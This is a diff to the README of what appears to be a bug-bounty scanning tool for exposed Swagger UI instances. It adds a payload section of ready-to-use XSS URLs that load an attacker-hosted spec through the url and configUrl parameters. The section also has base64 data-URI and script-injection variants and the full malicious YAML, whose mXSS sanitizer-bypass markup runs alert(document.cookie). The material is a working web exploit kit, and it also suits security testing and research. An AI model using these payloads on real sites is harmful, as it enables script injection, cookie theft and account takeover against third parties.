@@ -32,4 +32,73 @@ chmod +x swagger.sh
 ```sh
 ./swagger.sh sites.txt swagger.txt 
 ```
-    
+## **Payload**
+
+***Example*** : {site}/{swagger_endpoint}?{parameter}={payload}
+- site.com/swagger?url=https://codelatte.id/xss.yaml
+- site.com/swagger?configUrl=https://codelatte.id/xss.json
+- site.com/swagger/?url=https://codelatte.id/xss.yaml
+- site.com/swagger/?configUrl=https://codelatte.id/xss.json
+- site.com/swagger/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9jb2RlbGF0dGUuaWQveHNzLnlhbWwiCn0=
+- site.com/swagger/?url=%3Cscript%3Ealert(atob(%22MQ==%22))%3C/script%3E
+- site.com/swagger?url=%3Cscript%3Ealert(atob(%22MQ==%22))%3C/script%3E
+
+**https://codelatte.id/xss.json**
+```
+{
+    "url": "https://codelatte.id/xss.yaml",
+    "urls": [
+        {
+            "url": "https://codelatte.id/xss.yaml",
+            "name": "XSS Document"
+        }
+    ]
+}
+
+```
+**https://codelatte.id/xss.yaml**
+```
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/accounts/groupid/{id}':
+...
+```
+
+**base64encode**
+```
+ewoidXJsIjoiaHR0cHM6Ly9jb2RlbGF0dGUuaWQveHNzLnlhbWwiCn0=
+```
+**base64decode**
+```
+{
+   "url":"https://codelatte.id/xss.yaml"
+}
+```
+## **References**
+
+- https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/
+- https://medium.com/@ghostlulzhacks/swagger-api-c07eca05441e
